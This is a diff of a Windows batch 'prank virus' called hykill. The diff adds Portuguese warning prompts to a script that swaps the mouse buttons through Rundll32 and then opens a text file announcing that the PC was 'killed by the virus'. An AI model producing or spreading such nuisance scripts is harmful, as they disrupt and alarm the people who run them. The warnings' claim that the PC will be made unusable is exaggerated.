@@ -1,4 +1,8 @@
 @echo off
+echo esse softoware é considerado um malware vc quer mesmo continuar
+pause
+echo Aviso final vc quer mesmo fazer seu pc ficar inutilizavel
+pause
 Rundll32 user32 , SwapMouseButton
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
